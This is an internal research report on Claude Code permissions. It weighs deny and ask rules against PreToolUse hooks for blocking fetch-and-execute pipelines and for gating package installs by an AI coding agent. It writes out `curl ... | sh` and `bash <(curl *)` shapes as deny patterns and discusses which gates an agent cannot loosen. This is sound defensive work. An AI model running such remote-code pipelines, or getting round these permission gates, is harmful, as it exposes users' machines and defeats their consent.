---
topic: "Whether Claude Code deny rules can block fetch-and-execute pipelines and gate package installation, or whether these require a PreToolUse hook"
slug: deny-rules-vs-hooks
researched: 2026-07-29
sources: [./sources.md]
---

# Research: Deny rules vs. PreToolUse hooks for fetch-and-execute and package-install gating

> **Executive summary.** Two clean answers, one of which overturns a held decision and one of which replaces a planned build with a config change.
> **Q1 — pipeline decomposition is REAL and the 10 held bare-interpreter rules should SHIP.** The official docs state the separator set (`&& || ; | |& & ` + newlines) and that "A rule must match each subcommand independently" [S1], and — the decisive corroboration prior work lacked — that approving `git status && npm test` "saves a rule for `npm test`", i.e. Claude Code *emits* per-subcommand rules, which is only coherent if it *matches* per-subcommand [S1]. So `curl https://x | sh` decomposes to `curl https://x` + `sh`, and a bare `Bash(sh)` deny matches the second subcommand. Symmetrically, any pattern containing a pipe (`Bash(curl * | sh*)`) can never match, because no subcommand ever contains the separator that defined it — prior work's finding is **confirmed**. There is **no startup warning** for pipe-containing patterns; the documented warning set covers untrusted-workspace allow rules and unmatched *file-path* patterns only [S3]. Absence of a warning is therefore not evidence a rule works — which is precisely why a dead pipe rule is dangerous to ship.
> **Q2 — `ask` meets the requirement natively; do NOT build a hook for this.** `permissions.ask` exists as a first-class array [S1][S4], uses identical `Bash(...)` pattern syntax, and the prompt already displays the exact command with a `Ctrl+E` risk explainer [S1]. Critically, **`ask` cannot be silenced**: a matching ask rule "prompts even when a more specific allow rule also matches the same call" [S1], it survives `bypassPermissions` [S1], and it survives a PreToolUse hook returning `allow` [S1]. That is literally "no packages without explicit user consent," per invocation, unoverridable. The user's "tell the user the exact command to run if they approve" affordance is an artifact of assuming a *deny* mechanism — with `ask` there is nothing to suggest, because approving the prompt runs the command. **Recommendation: add a `permissions.ask` template + a `--key` generalization of `merge-settings-deny.js` (~15 lines). Drop the hook for this requirement.**
> **Q3 — friction is low.** Only commands Claude types directly are gated; everything inside this repo's own shell scripts is a subprocess and invisible to the permission system [S1][S5]. Realistic cost is a handful of prompts per week.

## Research Questions

1. Does Claude Code decompose a compound command on `|` *before* matching permission rules, such that a bare `Bash(sh)` deny matches the `sh` subcommand of `curl https://x | sh`?
2. Does Claude Code emit a startup warning for deny patterns it accepts but cannot enforce (as it does for `Write(...)` path rules)?
3. Does a `permissions.ask` tier exist; what does the user see; is approval per-invocation or sticky; does it share `Bash(...)` pattern syntax?
4. Can a PreToolUse hook surface a *suggested resolution* to the user, and does it receive the raw undecomposed command string?
5. What is the day-to-day false-positive cost of gating `npm install` / `pip install` at the tool-call level?

## Current State (Codebase)

- `lib/scripts/templates/settings-deny.json` — 37-entry canonical deny list, a flat JSON array of strings.
- `lib/scripts/merge-settings-deny.js` — additive-only merge into `~/.claude/settings.json`. **Hardcodes the target key in exactly one place** (`const deny = permissions.deny || (permissions.deny = [])`, line 84), plus a `--source` default pointing at `templates/settings-deny.json` (line 26). Entries are opaque strings; the only validation is `typeof e === 'string'` (line 52). Dedup is `Set`-based (line 86). There is no removal path. [S5]
- `lib/hooks/` — 12 hook scripts (Serena guards, `env-file-guard.js`, `git-protected-ops-block.js`, `mv-absolute-path-block.js`) installed to `~/.claude/hooks/`; wiring into `~/.claude/settings.json` `PreToolUse` is a documented manual step. An established pattern exists if a hook is ever needed. [S6]
- Live `uvx --from git+` invocations: `lib/scripts/bootstrap-serena.sh:35` (prewarm) and `lib/scripts/install-mcps.sh:296-298` (registers the server command). `lib/scripts/bootstrap-serena.sh:51` is an *echoed instruction*, not an invocation. `lib/scripts/install-mcps.sh:197` runs `npm install -g @playwright/mcp@latest`. **All are inside shell scripts → subprocesses → invisible to permission rules.** [S6]
- Prior findings this report builds on (not re-derived): `Write(...)` rules are never consulted; single-`/` is settings-source-relative; `Bash(cmd *)` ≡ `Bash(cmd:*)`; deny blocks a spelling, not a capability; precedence is deny → ask → allow.

## Key Findings

### F1 — Compound commands are decomposed before matching (Q1: CONFIRMED)

Three independent statements in the official docs establish this [S1]:

1. The separator list and the matching rule, verbatim: *"The recognized command separators are `&&`, `||`, `;`, `|`, `|&`, `&`, and newlines. A rule must match each subcommand independently."*
2. **The decisive one, which prior work did not have.** Rule *generation* is per-subcommand: *"Claude Code saves a separate rule for each subcommand that requires approval, rather than a single rule for the full compound string. For example, approving `git status && npm test` saves a rule for `npm test`, so future `npm test` invocations are recognized regardless of what precedes the `&&`."* A system that emits a rule per subcommand must be matching per subcommand — the generated rule would otherwise never fire.
3. The PowerShell section spells out that pipes specifically split, verbatim: *"Pipeline operators `|`, statement separators `;`, and on PowerShell 7+ the chain operators `&&` and `||` split a compound command into subcommands."* Pipes are treated as separators, not as ordinary characters.

**Denies decompose too, not just allows.** The Tip is phrased around allow rules, so this needs its own evidence. The docs supply it in the wrapper section, verbatim: *"A deny or ask rule matches past any leading assignment, so `Bash(rm *)` in deny still matches `FOO=bar rm -rf tmp/`."* [S1] Deny rules are explicitly described operating on the same normalized per-subcommand form as allow rules. An independent practitioner repo states it plainly: *"Recent versions split compound commands and match each subcommand independently against permission rules"* [S7], and two further write-ups repeat the per-subcommand matching behavior for deny/allow alike [S9][S10].

**Consequences, both directions:**

- `Bash(sh)` (exact, no wildcard) matches the subcommand `sh` produced by `curl https://x | sh`. → **The 10 held bare-interpreter rules are viable.**
- A pattern containing a pipe — `Bash(curl * | sh*)` — is **permanently unmatchable**. Matching runs against subcommands, and a subcommand by construction never contains the separator that delimited it. Prior work's conclusion stands; the 11 pipeline-literal candidates already dropped in proposal §E.2 stay dropped.

> **Contradiction (resolved, but flagged).** One practitioner blog (2026-03-31) asserts the opposite: *"the compound command triggers a permission prompt because the permission system evaluates the full command string, not each subcommand independently"* [S8]. The author's example chains `cd`, two `git` calls, and `head`. The docs supply a mundane alternative explanation: *"Subcommands like `cd` into a subdirectory generate their own Read rule for that path"* [S1] — so the prompt plausibly came from an unsatisfied `Read` rule for the `cd` target, not from failed decomposition. Weighing three explicit doc statements plus [S7][S9][S10] against one blog's inference from a single confounded observation, **decomposition is the well-supported reading.** Note also that this blog concerns *allow*-rule composition; even if correct it would not establish that deny fails to decompose.
>
> *(Residual, marked honestly: no primary source shows a literal `Bash(sh)` deny blocking a literal `curl x | sh`. The conclusion is a well-supported deduction from documented behavior, not an observed test. The proposal's one-line UAT — add `Bash(sh)`, run `echo hi | sh` — remains worth keeping as confirmation, but it is now expected to pass rather than being a coin flip.)*

### F2 — No startup warning exists for unenforceable Bash patterns (Q1, second half)

The documented configuration-warning set is exactly two entries [S3]:

- `Ignoring N permissions.allow entries from ... this workspace has not been trusted`
- `... is not matched by file permission checks` — and this one is scoped to **path** patterns: *"A path pattern in your `permissions.allow` or `permissions.deny` rules doesn't match any files."*

Two further warnings live in the permissions doc: one for parameter rules on a primary content field (*"A rule like `Bash(command:rm *)` would be bypassable by a compound command, so Claude Code ignores it and emits a startup warning"*) and one for tool-name typos [S1].

**None covers a Bash *command* pattern that can never match.** A pipe-containing deny rule is accepted silently and does nothing. This is the false-confidence failure mode the task brief warns about, and it means **absence of a startup warning is not evidence a rule is live.** There is no static validation to lean on; correctness has to come from understanding the matcher.

*(Also relevant: `claude permission-check <path>` exists as a diagnostic [S3], but the docs present it for path patterns only — no equivalent command-pattern checker is documented. (inference — no primary source for a command-pattern variant.))*

### F3 — `permissions.ask` exists, shares Bash syntax, and cannot be silenced (Q2a: the answer)

**It exists.** The permissions UI documents three tiers, verbatim: *"**Ask** rules prompt for confirmation whenever Claude Code tries to use the specified tool"* [S1]. Managed-settings docs reference *"`allow`, `ask`, or `deny` permission rules"* as the three arrays [S1]. Multiple third-party configuration guides show the literal `"ask": [...]` array alongside `allow`/`deny` in `settings.json`, including content-scoped Bash entries like `Bash(git commit*)` [S4-community]. The official settings page's own example happens to show only `allow`/`deny`, which is why this needed corroborating [S4].

**Same pattern syntax.** Ask rules are documented in the same breath as deny throughout: they accept `Tool(param:value)` matching, tool-name glob patterns, and the same file-path prefix semantics (`Read(secrets/**)` "as a deny or ask rule" matches at any depth) [S1]. The docs' own example of a content-scoped ask rule is `Bash(git push *)` [S1]. No separate syntax to learn, and the existing template's authoring conventions carry over unchanged.

**The user sees the exact command.** The Bash permission prompt renders the command string plus Claude's description of it. Additionally, verbatim: *"press `Ctrl+E` to show an explanation of the command: what it does, why Claude is running it, and what could go wrong, labeled **Low risk**, **Med risk**, or **High risk**"* [S1]. So the consent surface is strictly *better* than what a hook `systemMessage` could print — it is the real command, in the standard approval UI, with an on-demand risk analysis.

**Approval is per-invocation and unoverridable — this is the load-bearing property.** Three separate guarantees:

| Guarantee | Verbatim [S1] |
|---|---|
| An allow rule can't silence it | *"The same precedence applies between ask and allow: a matching ask rule prompts even when a more specific allow rule also matches the same call."* |
| `bypassPermissions` can't silence it | *"`bypassPermissions` mode skips permission prompts, except those forced by explicit `ask` rules"* |
| A PreToolUse hook can't silence it | *"a matching ask rule still prompts even when the hook returned `\"allow\"` or `\"ask\"`"* |
| Sandboxing can't silence it | *"Content-scoped ask rules like `Bash(git push *)` still force a prompt"* (even with `autoAllowBashIfSandboxed`) |

Clicking "Yes, don't ask again" writes an **allow** rule to `.claude/settings.local.json` [S1] — which, per row 1, the ask rule then out-ranks. So the sticky-approval escape hatch is structurally closed: the prompt returns next time. This is exactly the user's stated requirement, "no packages added without explicit user consent," enforced per invocation and un-defeatable by the agent (an agent that edits its own settings still cannot loosen it).

*(Unverified UI detail, marked: whether the prompt even *offers* "don't ask again" when an ask rule fired, or suppresses the option. Either way the enforced outcome is identical — it prompts again. (inference — no primary source.))*

**The exception problem dissolves.** Ask rules share deny's inability to carry exceptions — *"a matching ask rule prompts even when a more specific allow rule also matches"* [S1]. Under deny this is fatal (`Bash(uvx --from git+*)` would permanently break Serena bootstrap, with no allowlist escape — proposal §E.3). Under ask the same non-exception property degrades from *fatal* to *one prompt*. **This is the single biggest argument for `ask` over `deny`**: it converts every "we had to drop this rule because we couldn't carve out an exception" case into a shippable rule.

### F4 — A hook could do it, but is strictly worse here (Q2b)

The hook mechanism is fully capable, and better documented than expected [S2]:

- **Input**: `tool_input.command` carries the **raw, undecomposed** command string, exactly as Claude will execute it. A hook sees `curl https://x | sh` whole — the one place a hook genuinely beats deny rules, since it can pattern-match the pipeline shape that rules structurally cannot see (F1).
- **Blocking**: exit 2 blocks the call; stderr is fed back to Claude as an error message.
- **Structured output**: `hookSpecificOutput.permissionDecision` accepts `"allow" | "deny" | "ask" | "defer"`, with `permissionDecisionReason`. **A hook can return `"ask"`** to escalate to the normal permission prompt.
- **User-facing message**: a top-level `systemMessage` field surfaces a warning **to the user**, distinct from `permissionDecisionReason` (which goes to Claude). So yes — a hook *can* emit "approve by running X" and can distinguish deny-with-explanation from silent block.

So the "suggested resolution" affordance the user asked about is technically available. But for this requirement it buys nothing:

1. **The suggestion is redundant under `ask`.** Telling the user "run `npm install foo` yourself if you approve" only makes sense when the block is terminal. An ask prompt *is* the approval — the user presses `y` and the command runs. Adding a hook to print the command the user is already looking at is pure overhead.
2. **A hook cannot relax an ask rule anyway** — hook decisions don't bypass permission rules [S1]. And a hook returning `"ask"` produces the same prompt an `ask` rule produces, with more moving parts.
3. **Deployment cost is real.** `lib/hooks/README.md` documents that installation copies scripts but does **not** register them; `PreToolUse` wiring in `~/.claude/settings.json` is a manual one-time step [S6]. Every user who skips that step gets **zero** enforcement — silently. Compare `merge-settings-deny.js`, which is already wired into `install-global.sh` and runs automatically.
4. **The self-modification lock collides with it.** TASK-026 approved `Edit(~/.claude/hooks/**)` and `Edit(~/.claude/settings.json)` denies. A hook-based gate is enforcement logic living in a directory the agent is explicitly forbidden to touch — good for integrity, but it means hook fixes require an out-of-band `install-global.sh` re-run.

**Where a hook is still required** (unchanged from prior work): correlating a download-then-execute pair split across two tool calls; inspecting inside `python -c` / `node -e`; absolute-path fetcher invocation; and allowlisting `oraios/serena` while gating other `uvx --from git+` sources. None of these are the package-consent requirement.

### F5 — Deny's failure mode for this requirement (Q2c)

Plainly: hard block, no override, no consent path. Deny beats ask and allow at every scope [S1]; it survives `bypassPermissions`; it cannot carry an allowlist exception [S1]; and the transcript shows a block with no route to proceed. Applied to `npm install *`, the user's own approved workflow ("no packages **without explicit user consent**" — consent implies a yes path) becomes impossible: there is no yes. Deny answers a different question ("never, under any circumstance") than the one asked.

> **Community error worth flagging.** A training-provider guide advises: *"Add `Bash(npm install *)` to deny and use `Bash(npm install --ignore-scripts)` in allow"* [S11]. This **does not work** and directly contradicts the docs: *"A broad deny rule like `Bash(aws *)` blocks every matching call, including calls that also match a narrower allow rule like `Bash(aws s3 ls)`, so a deny rule can't carry allowlist exceptions"* [S1]. The deny wins; `--ignore-scripts` is blocked too. If this shape appears anywhere in the repo's guides, it is wrong. It also happens to be exactly the pattern `ask` handles correctly.

### F6 — False-positive cost is low (Q3)

The structural mitigation confirmed in the codebase: permission rules evaluate only commands Claude types into a Bash tool call. Commands inside a shell script are subprocesses, invisible to the permission system [S1][S5]. Verified against this repo — `install-mcps.sh:197` (`npm install -g @playwright/mcp@latest`), `bootstrap-serena.sh:35` (`uvx --from git+...`), and `install-mcps.sh:296-298` are all script-internal and **unaffected** [S6]. Every `npx @codewizard-dt/bootstrap` entry point stays prompt-free.

What actually gets gated is Claude typing `npm install <pkg>` mid-session — which is *exactly* the event the user wants to consent to. Frequency is low: adding a dependency is a deliberate act a few times a week, not a hot-loop operation. Note also that `npm install` / `pip install` are **not** in the built-in read-only command set (`ls`, `cat`, `echo`, `grep`, `find`, `cd`, read-only `git`, …) [S1], so they already prompt today in `default` mode for anyone without an allow rule. For most users an `ask` rule changes nothing about the *number* of prompts; it changes whether the prompt can be permanently dismissed. **The marginal friction is borne only by users who had previously allowlisted installs** — and that is the intended behavior change, not a regression.

Residual friction to document: `Bash(uvx --from git+*)` as an ask rule prompts once during Serena bootstrap if a user runs the registration command by hand rather than via the script.

## Constraints

- Ask and deny rules both refuse allowlist exceptions [S1] — plan for prompts on legitimate cases rather than trying to carve them out.
- No startup validation for command patterns [S3] — a dead rule ships silently; correctness is on the author.
- `merge-settings-deny.js` is additive-only with no removal path [S5] — an `ask` entry, once merged into a user's settings, is permanent from the tooling's side. Ship a smaller set than feels comfortable.
- Hooks require manual `PreToolUse` wiring [S6]; deny/ask merging is already automatic via `install-global.sh`.
- Permission rules are enforced by Claude Code, not the model or the OS [S1] — none of this is a boundary against a determined agent; `/sandbox` remains Tier 3.

## Verdict table

| # | Shape | Verdict | Basis |
|---|---|---|---|
| 1 | Pipe-to-interpreter pattern — `Bash(curl * \| sh*)`, `Bash(wget * \| bash*)` | **DENY-USELESS** | Matching runs on subcommands; a subcommand never contains its own separator. Accepted silently, no warning. **Never ship.** [S1][S3] |
| 2 | Bare-interpreter deny — `Bash(sh)`, `Bash(bash)`, `Bash(zsh)`, `Bash(python)`, `Bash(python3)`, `Bash(node)`, `Bash(ruby)`, `Bash(perl)`, `Bash(sh -s*)`, `Bash(bash -s*)` | **DENY-VIABLE** — ship all 10 | Matches the pipe's *target* subcommand. FP≈0: a bare interpreter from a tool call opens a REPL that would hang. Untouched: `bash -n`, `node script.js`, `python3 -m pytest`. [S1][S7] |
| 3 | `bash <(curl *)` process substitution — `Bash(bash <*)`, `Bash(sh <*)`, `Bash(zsh <*)`, `Bash(node <*)` | **DENY-VIABLE** — ship all 4 | No separator → one subcommand → pattern matches directly. Highest-confidence entry in B2; independent of F1. [S1] |
| 4 | Download-then-execute split across two tool calls | **HOOK-REQUIRED** (and weak even then) | Each half individually innocuous; no rule sees the correlation. Needs cross-call state a hook must keep itself. Tier 2/3. [S1] |
| 5 | Registry installs — `npm install *`, `pip install *`, `pip3 install *`, `yarn add *`, `pnpm add *`, `cargo add *`, `gem install *` | **ASK-BETTER** | Deny has no yes-path, contradicting "explicit user consent". `ask` prompts per invocation, shows the exact command, and cannot be silenced by an allow rule, `bypassPermissions`, or a hook. [S1] |
| 6 | Non-registry installs — `pip install git+*`, `npm install http*`, `npm install git+*`, `cargo install --git *`, `npx http*` | **ASK-BETTER** (deny also viable) | Deny works — no separator, no exception needed. But `ask` is the better default: same protection, keeps a legitimate one-off possible, and unifies the story with row 5. Deny only if the user wants these categorically impossible. |
| 7 | `uvx --from git+*` with an `oraios/serena` exception | **ASK-BETTER** — deny provably cannot | Deny + a narrower allow does **not** work: *"a deny rule can't carry allowlist exceptions"* [S1] → Serena bootstrap breaks (proposal §E.3, correctly dropped). `ask` reduces this to one prompt on a rarely-hand-run command. A hook could allowlist by URL, but that is a lot of machinery for one prompt. |

## Recommendation

**Q1 — release the hold; ship all 14 B2 rules.** Add the 10 held bare-interpreter denies (`Bash(sh)`, `Bash(bash)`, `Bash(zsh)`, `Bash(python)`, `Bash(python3)`, `Bash(node)`, `Bash(ruby)`, `Bash(perl)`, `Bash(sh -s*)`, `Bash(bash -s*)`) alongside the 4 already-approved process-substitution rules. Approved core goes **72 → 82**. Keep the `echo hi | sh` UAT as confirmation. Keep every pipe-containing pattern permanently out of the template, and add a comment in `settings-deny.json` saying why, so nobody re-proposes them — there is no startup warning to catch the mistake.

**Q2 — use `permissions.ask`; do not build a hook for this.** It meets the requirement natively and is the far cheaper answer.

Implementation:

1. New `lib/scripts/templates/settings-ask.json` — same flat string-array shape. Suggested initial set (deliberately small, since the merge has no removal path): `Bash(npm install *)`, `Bash(npm i *)`, `Bash(pnpm add *)`, `Bash(yarn add *)`, `Bash(pip install *)`, `Bash(pip3 install *)`, `Bash(uv pip install *)`, `Bash(uvx --from git+*)`, `Bash(cargo install *)`, `Bash(cargo add *)`, `Bash(gem install *)`, `Bash(go install *)`, `Bash(brew install *)`.
2. Generalize `merge-settings-deny.js` with a `--key` argument (default `deny`) — a one-line change at line 84 plus arg parsing at lines 28-31 and message wording at 91/121/123. Consider renaming to `merge-settings-permissions.js` with a back-compat shim, since the header comment already needs rewording for the `Edit(...)`/`Read(...)` entries. **~15 lines total.**
3. Call it twice from `install-global.sh`: once for `deny`, once for `--key ask --source templates/settings-ask.json`.
4. Document in `lib/scripts/README.md`, next to the A1 self-modification-lock note: installs now prompt every time and the prompt cannot be permanently dismissed — by design.

**Why not the hook:** it is redundant (the ask prompt already shows the exact command with a `Ctrl+E` risk explainer), it cannot loosen an ask rule anyway, it needs manual `PreToolUse` wiring that silently no-ops when skipped, and it lands in a directory the approved A1 lock forbids the agent from touching. Build a Tier-2 hook for the things only a hook can do — cross-tool-call correlation, `python -c` interiors, absolute-path invocation — not for consent.

**Risks & mitigations:**
- *Prompt fatigue if the ask list grows* → start with the 13 above; the merge script has no removal path, so under-ship deliberately.
- *`ask` cannot be dismissed, which will surprise people* → document it as the feature it is; escape hatch is hand-editing `~/.claude/settings.json` outside Claude Code (same as A1).
- *Decomposition is deduced, not observed* → the `echo hi | sh` UAT is cheap; run it before release. If it fails, pull the 10 and re-route to Tier 2 — the other 4 process-substitution rules are unaffected either way.
- *Third-party guides teach the broken deny+allow pattern* [S11] → add an explicit counter-note in the delivered guide.

**Alternative if constraints change:** if the repo ever ships `--dangerously-skip-permissions` agents by default, `ask` becomes the *only* surviving prompt mechanism [S1] and gets more important, not less — but at that point Tier 3 `/sandbox` is the real answer.

## Next Steps

- Update TASK-026 step 3: release the B2 bare-interpreter hold (10 entries), approved core 72 → 82.
- `/task-add` — implement `permissions.ask`: new template + `--key` generalization of the merge script + `install-global.sh` wiring + `lib/scripts/README.md` docs.
- `/wiki-ingest raw/research/deny-rules-vs-hooks/index.md`.
- Keep the Tier-2 hook follow-on scoped to what only a hook can do (cross-call correlation, interpreter interiors, absolute-path invocation) — explicitly **not** package consent.
